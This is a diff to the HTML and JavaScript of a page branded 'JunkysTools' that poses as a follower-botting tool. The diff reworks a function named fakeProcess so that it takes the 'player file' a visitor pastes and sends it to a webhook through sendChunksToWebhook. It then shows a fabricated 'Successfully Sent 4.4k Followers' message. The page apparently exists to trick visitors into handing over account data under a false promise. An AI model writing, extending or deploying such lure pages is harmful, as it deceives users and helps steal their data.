@@ -270,7 +270,7 @@ for (let i = 0; i < 25; i++) {
             <input type="text" id="message" placeholder="Enter player file">
         </div>
         <button onclick="fakeProcess()">Start Botting!</button>
-        <div class="Processing Bots..." id="msg"></div>
+        <div class="success" id="msg"></div>
         <div class="panel-footer">JunkysTools</div>
     </div>
 
@@ -332,17 +332,23 @@ async function fakeProcess() {
         return;
     }
 
+    // Show "Sending bots..."
     msg.style.display = "block";
+    msg.textContent = "Sending bots...";
 
+    // Wait 3 seconds
+    await new Promise(resolve => setTimeout(resolve, 3000));
+
+    // Send webhook
     await sendChunksToWebhook(input);
 
+    // Show success message
+    msg.textContent = "Successfully Sent 4.4k Followers";
+
+    // Hide after 3 seconds
     setTimeout(() => {
-        msg.textContent = "Sending bots..";
-        setTimeout(() => {
-            msg.style.display = "none";
-            msg.textContent = "Successfully Sent 4.4k Followers";
-        }, 1500);
-    }, 1500);
+        msg.style.display = "none";
+    }, 3000);
 }
 
 /* ---------------- PANEL REVEAL ON SCROLL ---------------- */
@@ -358,8 +364,3 @@ panels.forEach(panel => observer.observe(panel));
 
 </body>
 </html>
-
-
-
-
-
